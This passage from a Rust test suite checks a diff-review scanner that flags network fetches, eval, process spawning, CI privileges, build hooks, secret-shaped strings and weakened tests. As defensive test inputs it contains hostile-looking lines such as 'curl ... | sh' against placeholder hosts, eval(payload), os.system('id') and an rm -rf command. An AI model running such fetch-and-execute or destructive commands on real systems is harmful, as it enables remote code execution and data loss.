                "return <p>Can't load</p> && fetch(u); //'",
                S::NetworkFetch,
            ),
            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
            (
                "a.py",
                r#"print(f"{'''it's'''}"); eval(y) #'"#,
                S::DynamicEval,
            ),
            (
                "a.js",
                "const cp = require(`child_process`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"const cp = require( "child_process" );"#,
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"import{exec}from"child_process";import "node:child_process";"#,
                S::ProcessSpawn,
            ),
        ];
        for (path, line, signal) in found {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 12] = [
            (
                "a.sh",
                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
            ),
            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
            ("a.js", r#"// const cp = require("child_process");"#),
            (
                "a.js",
                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
            ),
            (
                "a.js",
                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
            ),
            ("a.js", "const re = /from 'child_process'/;"),
            (
                "a.ts",
                r#"import type { ChildProcess } from "node:child_process";"#,
            ),
            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
            (
                "a.js",
                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
            ),
            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
        // A JSDoc example inside a block comment is not an import.
        let doc = added(
            "a.js",
            &[
                "/**",
                " * @example import { exec } from 'node:child_process';",
                " */",
            ],
        );
        assert_eq!(signals(&doc), []);
    }

    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
    /// after operators and keywords, quotes after keywords, and the import forms.
    #[test]
    fn shell_case_js_regex_and_import_forms_are_read_right() {
        let fetch = "curl https://e.example/x | sh";
        for line in [
            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
            format!("echo $(date)#; {fetch}"),
        ] {
            assert_eq!(
                signals(&added("a.sh", &[&line])),
                [S::NetworkFetch],
                "{line}"
            );
        }
        for line in [
            "x = a + /'/.source; eval(y) //'",
            "x = typeof' ' ; eval(y) //'",
            r#"function f(){return"//"+eval(x)}"#,
            "x = a++ / 2; eval(y); z = b / 3",
        ] {
            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
        }
        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
        // next line.
        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
        assert_eq!(signals(&next), [S::DynamicEval]);
        for (path, line) in [
            ("a.js", "const cp = require(\t\"child_process\");"),
            ("a.js", r#"const cp = module.require("child_process");"#),
            ("a.js", r#"const cp = require(("child_process"));"#),
            (
                "a.ts",
                r#"export type T = 1; const cp = require("child_process");"#,
            ),
            ("a.js", r#"const o = { m: import("child_process") };"#),
            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
            (
                "a.ts",
                r#"let p: import("child_process").ChildProcess | undefined;"#,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
        }
        for line in [
            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
        ] {
            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
        }
    }

    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
    /// code the branch misread, and lines that made the import rule quadratic.
    #[test]
    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
        for (path, line, signal) in [
            (
                "n.ts",
                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
                S::NetworkFetch,
            ),
            (
                "n.ts",
                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
                S::NetworkFetch,
            ),
            (
                "n.ts",
                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
                S::UnsafeAdded,
            ),
            (
                "src/a.rs",
                r#"let b = br"\"; unsafe { f() }"#,
                S::UnsafeAdded,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        // A line that continues an expression with `/` divides; one after `=` opens a regex.
        let divided = added(
            "m3.js",
            &[
                "const elapsed = (Date.now() - start)",
                "  / 1000; fetch(`/api/timing/${elapsed}`);",
            ],
        );
        assert_eq!(signals(&divided), [S::NetworkFetch]);
        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
        assert_eq!(signals(&regex), []);
        // A raw string's text is still text, and an ordinary string still escapes.
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
    }

    #[test]
    fn the_import_rule_is_linear_on_long_lines() {
        within_deadline(|| {
            let start = ScanClock::start();
            for unit in [
                "Array.from(x),",
                "from ",
                "require ",
                "import ",
                "require(require(",
            ] {
                let line = unit.repeat(200_000);
                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
            }
            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
            // Linear scans of these lines took about 2 s in a debug build; the quadratic import
            // rule of eee2b4c^ took about 66 s.
            let spent = start.elapsed();
            assert!(
                spent < std::time::Duration::from_secs(15),
                "the long lines took {spent:?} of {}",
                start.kind
            );
        });
    }

    /// The time a scan spends: the thread's own CPU time where Linux reports it, so a busy host
    /// does not fail the bound (a starved run measured 1.8 s of CPU in over 10 s of wall time),
    /// and wall time elsewhere.
    struct ScanClock {
        kind: &'static str,
        cpu_ns: Option<u64>,
        wall: std::time::Instant,
    }

    impl ScanClock {
        fn start() -> Self {
            let cpu_ns = thread_cpu_ns();
            #[expect(
                clippy::disallowed_methods,
                reason = "test door: the fallback clock where no CPU time is reported"
            )]
            let wall = std::time::Instant::now();
            let kind = if cpu_ns.is_some() {
                "thread CPU time"
            } else {
                "wall time"
            };
            Self { kind, cpu_ns, wall }
        }

        fn elapsed(&self) -> std::time::Duration {
            match (self.cpu_ns, thread_cpu_ns()) {
                (Some(then), Some(now)) => std::time::Duration::from_nanos(now - then),
                _ => self.wall.elapsed(),
            }
        }
    }

    /// The calling thread's CPU time in nanoseconds: the first field of Linux's
    /// `/proc/thread-self/schedstat`, or `None` where that file does not exist.
    fn thread_cpu_ns() -> Option<u64> {
        let stat = std::fs::read_to_string("/proc/thread-self/schedstat").ok()?;
        stat.split_whitespace().next()?.parse().ok()
    }

    /// Run `work` on its own thread and fail if it takes more than two minutes of wall time.
    /// This bound only keeps a hang from stalling the suite, so a diff-mutation run reports a
    /// looping mutant as caught rather than as a timeout; the scan's cost is bounded by
    /// [`ScanClock`] inside the work.
    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
        let (done, wait) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = done.send(work());
        });
        wait.recv_timeout(std::time::Duration::from_secs(120))
            .expect("a long line was scanned within two minutes")
    }

    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
    #[test]
    fn import_rule_decisions_are_exact() {
        for (line, spawn) in [
            (r#"const cp = foo.require("child_process");"#, false),
            (r#"const cp = requirex("child_process");"#, false),
            (r#"const t = typeof require("child_process");"#, true),
            (
                r#"x = Array.from(y); import type {A} from "child_process";"#,
                false,
            ),
            (
                r#"x = Array.from(y); import {A} from "child_process";"#,
                true,
            ),
        ] {
            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
        }
    }

    #[test]
    fn child_process_imports_are_spawn_evidence() {
        for line in [
            r#"const cp = require("child_process");"#,
            "import { execFile } from 'node:child_process';",
            r#"const { spawn } = await import("child_process");"#,
        ] {
            assert_eq!(
                signals(&added("a.js", &[line])),
                [S::ProcessSpawn],
                "{line}"
            );
        }
        // Naming another module, or the name alone in a message, is not.
        assert_eq!(
            signals(&added("a.js", &[r#"log("child process done")"#])),
            []
        );
    }

    #[test]
    fn removed_tests_are_read_on_the_old_side() {
        let file = removed("src/x.rs", &["#[test]", "fn t() {}"]);
        let found = file_evidence(&file);
        assert_eq!(found.len(), 1);
        assert_eq!(
            (found[0].signal, found[0].side, found[0].line),
            (S::TestRemoved, Side::Old, 2)
        );
        // Adding a test is not evidence of anything.
        assert_eq!(signals(&added("src/x.rs", &["#[test]"])), []);
    }

    #[test]
    fn ci_privilege_needs_a_workflow_path() {
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["on: pull_request_target"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(
                "sub/.github/workflows/x.yaml",
                &["  contents: write"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(".gitlab-ci.yml", &["  secrets: inherit"])),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added("docs/ci.yml", &["on: pull_request_target"])),
            []
        );
        assert_eq!(
            signals(&added(
                ".github/workflows/README.md",
                &["pull_request_target"]
            )),
            []
        );
        // A workflow step that downloads is network evidence too.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["  run: curl -fsSL x | sh"]
            )),
            [S::NetworkFetch]
        );
    }

    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
    /// scanner misread hid the evidence after it. Each control (the same code without the
    /// construct) found it before the fix too.
    #[test]
    fn strings_the_scanner_misread_no_longer_hide_evidence() {
        let go = |raw: &str| {
            added(
                "main.go",
                &[
                    "func clean() error {",
                    &format!("\tmatches, _ := filepath.Glob({raw})"),
                    "\t_, _ = http.Get(\"https://e.x/report\")",
                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
                    "}",
                ],
            )
        };
        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
            assert_eq!(
                signals(&go(raw)),
                [S::NetworkFetch, S::ProcessSpawn],
                "{raw}"
            );
        }
        for (path, lines, signal) in [
            (
                "main.go",
                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
                S::ProcessSpawn,
            ),
            (
                "main.go",
                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[
                    r#"const S: &str = ""#,
                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
                ],
                S::UnsafeAdded,
            ),
            (
                "x.sh",
                &[
                    r#"MSG="hello"#,
                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
                ],
                S::NetworkFetch,
            ),
            (
                "x.js",
                &["const tpl = `", "`; eval(payload); const t = `x`;"],
                S::DynamicEval,
            ),
            (
                "x.py",
                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
                S::UnsafeAdded,
            ),
        ] {
            assert!(
                signals(&added(path, lines)).contains(&signal),
                "{path}: {lines:?}"
            );
        }
        for (lines, signal) in [
            (
                &[
                    "      - run: |",
                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
                ][..],
                S::NetworkFetch,
            ),
            (
                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
                S::NetworkFetch,
            ),
            (
                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
                S::CiPrivilege,
            ),
        ] {
            assert_eq!(
                signals(&added(".github/workflows/ci.yml", lines)),
                [signal],
                "{lines:?}"
            );
        }
        // A YAML comment is still a comment.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
            )),
            []
        );
    }

    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
    /// `don't panic` line, and before strings were carried, both were found.
    #[test]
    fn a_misread_opener_in_context_hides_no_later_evidence() {
        let patch = |println: bool| {
            let mut added = vec![
                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
                "\t\treturn exec.Command(\"rm\", matches...).Run()",
            ];
            if println {
                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
            }
            let mut text = format!(
                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
                3 + added.len()
            );
            for context in [
                "It's safe to run twice.",
                "`,",
                "\tRunE: func(cmd *cobra.Command, args []string) error {",
            ] {
                text.push(' ');
                text.push_str(context);
                text.push('\n');
            }
            for line in added {
                text.push('+');
                text.push_str(line);
                text.push('\n');
            }
            parse(&text).unwrap().remove(0)
        };
        for println in [false, true] {
            assert_eq!(
                signals(&patch(println)),
                [S::NetworkFetch, S::ProcessSpawn],
                "println: {println}"
            );
        }
    }

    #[test]
    fn build_scripts_and_install_hooks_are_build_hooks() {
        assert_eq!(
            signals(&added("build.rs", &["fn main() {}"])),
            [S::BuildHook]
        );
        assert_eq!(signals(&added("build.rs", &["// only a comment", ""])), []);
        assert_eq!(
            signals(&added("sub/setup.py", &["setup(name='x')"])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"postinstall\": \"node x\","])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"name\": \"install-helper\","])),
            []
        );
    }

    #[test]
    fn secrets_are_found_by_shape_and_never_copied() {
        // Built at run time, so the repository's own secret scan never sees a token here.
        let aws = format!("key = \"AKIA{}\"", "Q7".repeat(8));
        let forge = format!("t='ghp_{}'", "a1".repeat(18));
        let chat = format!("# xoxb-{}", "12345-abcde");
        let stripe = format!("sk_live_{}", "Z".repeat(16));
        let header = format!("-----BEGIN {} PRIVATE KEY-----", "RSA");
        for line in [&aws, &forge, &chat, &stripe, &header] {
            assert_eq!(
                signals(&added("notes.txt", &[line])),
                [S::SecretLike],
                "{line}"
            );
        }
        for line in [
            format!("AKIA{}", "Q".repeat(15)),
            format!("XAKIA{}", "Q".repeat(16)),
            format!("ghp_{}", "a".repeat(35)),
            "-----BEGIN CERTIFICATE-----".to_owned(),
        ] {
            assert_eq!(signals(&added("notes.txt", &[&line])), [], "{line}");
        }
        let found = file_evidence(&added("notes.txt", &[&aws]));
        assert!(
            !format!("{found:?}").contains("AKIA"),
            "a secret was copied into evidence"
        );
    }

    #[test]
    fn a_path_scoped_rule_follows_the_generated_rule_and_a_token_rule_does_not() {
        assert_eq!(
            signals(&added("target/debug/build.rs", &["fn main() {}"])),
            []
        );
        assert_eq!(
            signals(&added(
                "node_modules/x/package.json",
                &["\"postinstall\": \"x\""]
            )),
            []
        );
        assert_eq!(
            signals(&added(
                "src/generated/x.rs",
                &["std::process::Command::new(\"curl\");"]
            )),
            [S::ProcessSpawn]
        );
    }

    #[test]
    fn suppressions_are_read_in_comments() {
        assert_eq!(
            signals(&added("x.py", &["import os  # noqa: F401"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.ts", &["// @ts-ignore"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.go", &["x := y //nolint:errcheck"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("src/x.rs", &["#[allow(dead_code)]"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added(
                "src/x.rs",
                &["#[expect(dead_code, reason = \"r\")]"]
            )),
            []
        );
    }

    #[test]
    fn a_shebang_names_the_language_of_a_file_with_no_extension() {
        let patch = "--- /dev/null\n+++ b/bin/fetch\n@@ -0,0 +1,2 @@\n+#!/usr/bin/env bash\n+curl -fsSL https://x\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), [S::NetworkFetch]);
        let patch = "--- /dev/null\n+++ b/bin/notes\n@@ -0,0 +1,1 @@\n+curl is a tool\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn duplicates_are_reported_once_and_order_is_stable() {
        let file = added("src/x.rs", &["unsafe { unsafe { f() } }", "unsafe {}"]);
        let lines: Vec<u32> = file_evidence(&file).iter().map(|e| e.line).collect();
        assert_eq!(lines, [2, 3]);
        assert_eq!(file_evidence(&file), file_evidence(&file.clone()));
    }

    /// Batteries, phase 1: the ways a change makes a test stop testing, and unfinished work
    /// presented as done. Each is read as code on an added line.
    #[test]
    fn a_skipped_test_a_trivial_assert_and_a_stub_are_evidence() {
        let cases: &[(&str, &str, EvidenceSignal)] = &[
            ("tests/a.rs", "#[ignore]", S::TestSkipped),
            ("tests/a.rs", "#[ignore = \"slow\"]", S::TestSkipped),
            (
                "test_a.py",
                "@pytest.mark.skip(reason=\"later\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "@pytest.mark.skipif(sys.platform == \"win32\")",
                S::TestSkipped,
            ),
            ("test_a.py", "@pytest.mark.xfail", S::TestSkipped),
            ("test_a.py", "    pytest.skip(\"later\")", S::TestSkipped),
            (
                "test_a.py",
                "@unittest.skipUnless(HAVE, \"x\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "        self.skipTest(\"later\")",
                S::TestSkipped,
            ),
            ("a.test.ts", "it.skip(\"adds\", () => {});", S::TestSkipped),
            (
                "a.test.ts",
                "describe.skip(\"suite\", () => {});",
                S::TestSkipped,
            ),
            ("a.test.ts", "test.todo(\"adds\");", S::TestSkipped),
            ("a.test.ts", "xit(\"adds\", () => {});", S::TestSkipped),
            ("a_test.go", "\tt.Skip(\"later\")", S::TestSkipped),
            ("a_test.go", "\tt.SkipNow()", S::TestSkipped),
            ("tests/a.rs", "    assert!(true);", S::TrivialAssert),
            (
                "tests/a.rs",
                "    assert_eq!(true, true);",
                S::TrivialAssert,
            ),
            ("test_a.py", "    assert True", S::TrivialAssert),
            (
                "test_a.py",
                "        self.assertTrue(True)",
                S::TrivialAssert,
            ),
            ("a.test.ts", "  expect(true).toBe(true);", S::TrivialAssert),
            ("a.test.ts", "  assert.ok(true);", S::TrivialAssert),
            ("src/a.rs", "    todo!()", S::StubAdded),
            ("src/a.rs", "    unimplemented!(\"later\")", S::StubAdded),
            ("a.py", "    raise NotImplementedError", S::StubAdded),
            (
                "a.py",
                "    raise NotImplementedError(\"later\")",
                S::StubAdded,
            ),
        ];
        for (path, line, signal) in cases {
            assert_eq!(signals(&added(path, &[line])), [*signal], "{path}: {line}");
        }
    }

    /// The same words where they are not that code: no evidence.
    #[test]
    fn near_misses_of_the_integrity_tokens_are_not_evidence() {
        let cases: &[(&str, &str)] = &[
            (
                "tests/a.rs",
                "// #[ignore] was here; assert!(true) and todo!() too",
            ),
            ("tests/a.rs", "let s = \"#[ignore] assert!(true) todo!()\";"),
            ("tests/a.rs", "#[ignored_by_default]"),
            ("tests/a.rs", "    assert!(true_enough(x));"),
            ("tests/a.rs", "    debug_assert!(truer);"),
            ("src/a.rs", "    my_todo!(x)"),
            (
                "test_a.py",
                "# pytest.mark.skip, assert True, raise NotImplementedError",
            ),
            ("test_a.py", "x = \"pytest.skip(\""),
            ("test_a.py", "    assert True_value"),
            ("test_a.py", "    assert Trueish is None"),
            ("a.py", "    raise NotImplementedErrorSubclass()"),
            ("a.py", "    x.raise_NotImplementedError()"),
            ("a.test.ts", "exit(code);"),
            ("a.test.ts", "submit.skip(1);"),
            ("a.test.ts", "console.assert(true);"),
            ("a.test.ts", "// it.skip(\"x\")"),
            ("a_test.go", "\tctx.t.Skip(\"x\")"),
            ("a_test.go", "\tit.Skip(\"x\")"),
            // the tokens of another language are not this file's
            ("a.go", "\ttodo!()"),
            ("a.ts", "#[ignore]"),
        ];
        for (path, line) in cases {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// A file from hunk body lines written as in a patch (`+`, `-` or a space first), after one
    /// context line `x`.
    fn hunk_of(path: &str, body: &[&str]) -> ReviewFile {
        let old = 1 + body.iter().filter(|l| !l.starts_with('+')).count();
        let new = 1 + body.iter().filter(|l| !l.starts_with('-')).count();
        let mut text = format!("--- a/{path}\n+++ b/{path}\n@@ -1,{old} +1,{new} @@\n x\n");
        for line in body {
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    /// A hunk that is the beginning of a new file: `body` lines without their `+`.
    fn new_file(path: &str, body: &[&str]) -> ReviewFile {
        let mut text = format!(
            "diff --git a/{path} b/{path}\nnew file mode 100644\n--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{} @@\n",
            body.len()
        );
        for line in body {
            text.push('+');
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn found(file: &ReviewFile) -> Vec<(EvidenceSignal, Basis, u32)> {
        file_evidence(file)
            .iter()
            .map(|e| (e.signal, e.basis, e.line))
            .collect()
    }

    /// Batteries, slice 2: a handler and its empty body are read together, on the line that
    /// opens the handler, and say that they were (`hunk`).
    #[test]
    fn an_error_handler_with_nothing_in_it_is_evidence_read_across_two_lines() {
        let swallowed = [(S::ErrorSwallowed, Basis::Hunk, 2)];
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    pass"]),
            (
                "a.py",
                &["+    except (KeyError, OSError) as e:", "+        ..."],
            ),
            ("a.py", &["+except Exception: pass"]),
            (
                "a.py",
                &["+except:  # nothing to do", "+    pass  # really"],
            ),
            ("a.ts", &["+} catch (e) {}"]),
            ("a.ts", &["+} catch { }"]),
            ("a.ts", &["+} catch (err) {", "+}"]),
            ("a.ts", &["+try { f(); } catch ({ message }) {", "+}"]),
            ("a.go", &["+\tif err != nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil {}"]),
            ("a.go", &["+\tif err := f(); err != nil {", "+\t}"]),
            // the body is the next line of the new file: a removed line between is not it,
            // and an unchanged line is
            (
                "a.py",
                &["+except ValueError:", "-    handle()", "+    pass"],
            ),
            ("a.py", &["+except ValueError:", "     pass"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), swallowed, "{path}: {body:?}");
        }
    }

    /// An arm or an assignment that drops the error on one line is found by its token.
    #[test]
    fn an_error_dropped_on_one_line_is_lexical_evidence() {
        for (path, line) in [
            ("src/a.rs", "        Err(_) => {}"),
            ("src/a.rs", "        Err(_) => (),"),
            ("a.go", "\t_ = err"),
        ] {
            assert_eq!(
                found(&added(path, &[line])),
                [(S::ErrorSwallowed, Basis::Lexical, 2)],
                "{path}: {line}"
            );
        }
    }

    /// A handler that does something, one whose body the hunk does not show, and the same
    /// words elsewhere: no evidence.
    #[test]
    fn a_handler_that_handles_or_whose_body_is_unseen_is_not_evidence() {
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    log(e)"]),
            ("a.py", &["+except ValueError:"]),
            ("a.py", &["+except ValueError:", "-    pass"]),
            ("a.py", &["+except ValueError: return None"]),
            ("a.py", &["+exceptional = 1", "+pass"]),
            ("a.py", &["+# except ValueError: pass"]),
            ("a.py", &["+s = \"except ValueError: pass\""]),
            ("a.py", &["+else:", "+    pass"]),
            ("a.ts", &["+} catch (e) { log(e); }"]),
            ("a.ts", &["+} catch (e) {", "+  log(e);"]),
            ("a.ts", &["+} catch (e) {"]),
            // a promise handler that does something (an empty one is evidence since review V3
            // round 1; before, no `.catch(…)` was read at all)
            ("a.ts", &["+p.catch((e) => { log(e); });"]),
            ("a.ts", &["+const catcher = {};"]),
            ("a.ts", &["+// } catch (e) {}"]),
            ("a.go", &["+\tif err != nil {", "+\t\treturn err"]),
            ("a.go", &["+\tif err == nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil && retry {", "+\t}"]),
            ("a.go", &["+\tfor err != nil {", "+\t}"]),
            ("a.go", &["+\t_ = errors.New(\"x\")"]),
            ("src/a.rs", &["+        Err(e) => {}"]),
            ("src/a.rs", &["+        Err(_) => { log(); }"]),
            // another language's form
            ("a.go", &["+except ValueError:", "+    pass"]),
            ("a.py", &["+} catch (e) {}"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), [], "{path}: {body:?}");
        }
    }

    /// A removed empty handler is the repair, and reading neighbours changes nothing a token
    /// rule finds: the same line, the same signals, the first rung.
    #[test]
    fn the_neighbour_reading_rule_leaves_token_evidence_as_it_was() {
        assert_eq!(
            found(&hunk_of("a.py", &["-except ValueError:", "-    pass"])),
            []
        );
        let file = hunk_of(
            "a.py",
            &["+import subprocess", "+subprocess.run(x)", "+eval(y)"],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 3),
                (S::DynamicEval, Basis::Lexical, 4),
            ]
        );
        assert_eq!(
            (Basis::Lexical.label(), Basis::Hunk.label()),
            ("lexical", "hunk")
        );
        assert!(Basis::Hunk > Basis::Lexical);
    }

    /// Rung 2: the new side of a Rust hunk is parsed, and what the parser reads is evidence
    /// whatever its spelling. An item it confirms says so.
    #[test]
    fn the_parser_finds_rust_constructs_whatever_their_spelling() {
        let cases: &[(&str, &[&str], EvidenceSignal)] = &[
            (
                "src/a.rs",
                &["+    let v = f().unwrap();"],
                S::PanicPathAdded,
            ),
            (
                "src/a.rs",
                &["+    let v = f()", "+        .expect(\"set\");"],
                S::PanicPathAdded,
            ),
            ("tests/a.rs", &["+    assert!( true );"], S::TrivialAssert),
            (
                "tests/a.rs",
                &["+    assert!(true, \"always\");"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+    assert_eq!(true , true);"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+#[cfg_attr(miri, ignore)]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            (
                "tests/a.rs",
                &["+#[ignore]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            ("src/a.rs", &["+    todo!( )"], S::StubAdded),
            // the hunk closes a block it did not open, and opens one it does not close
            (
                "src/a.rs",
                &[
                    "     y",
                    " }",
                    "+fn b() {",
                    "+    if c {",
                    "+        h().unwrap();",
                ],
                S::PanicPathAdded,
            ),
        ];
        for (path, body, signal) in cases {
            let items = found(&hunk_of(path, body));
            assert_eq!(items.len(), 1, "{path}: {body:?}: {items:?}");
            assert_eq!(
                (items[0].0, items[0].1),
                (*signal, Basis::SyntaxFragment),
                "{path}: {body:?}"
            );
        }
        assert_eq!(Basis::SyntaxFragment.label(), "syntax_fragment");
        assert!(Basis::SyntaxFragment > Basis::Hunk);
    }

    /// A panic path inside code the hunk proves is compiled only for tests is no evidence: the
    /// parser withdraws what the spelling found. The proof is an exact `#[cfg(test)]`, first
    /// attribute of a top-level module, function or `impl`, in a hunk that is the beginning of
    /// its file and parses with no error. Nothing less is proof (review V3 round 3, VD3R3-H-1):
    /// any attribute name but `cfg` can be bound to a macro that leaves the function in the
    /// program, and above a hunk from the middle of a file a comment or a string can be open.
    #[test]
    fn a_panic_path_under_a_proved_cfg_test_is_withdrawn() {
        let proved: &[&[&str]] = &[
            &[
                "pub fn real() {}",
                "",
                "#[cfg(test)]",
                "mod checks {",
                "    use super::*;",
                "    #[test]",
                "    fn a() {",
                "        assert_eq!(parse(\"x\").unwrap(), 1);",
                "        f().expect(\"set\");",
                "    }",
                "}",
            ],
            &["#[cfg(test)]", "fn helper() {", "    f().unwrap();", "}"],
            &[
                "/// For tests.",
                "#[cfg(test)]",
                "#[inline]",
                "impl Thing {",
                "    fn make() -> Self { f().expect(\"x\") }",
                "}",
            ],
        ];
        for body in proved {
            assert_eq!(found(&new_file("src/a.rs", body)), [], "{body:?}");
        }
    }

    /// Review V3 round 4, VD3R4-H-1. A hunk of an existing file that says it starts at line 1
    /// is not the beginning of the file: the header is the patch writer's word, and `git apply
    /// --unidiff-zero` or `-C0` applies the hunk further down, under a comment opened above
    /// it. Only the one hunk of a new file is certain to be the file. Before, this production
    /// panic path was withdrawn.
    #[test]
    fn a_hunk_that_only_says_it_starts_the_file_proves_no_test_code() {
        let forged = parse(
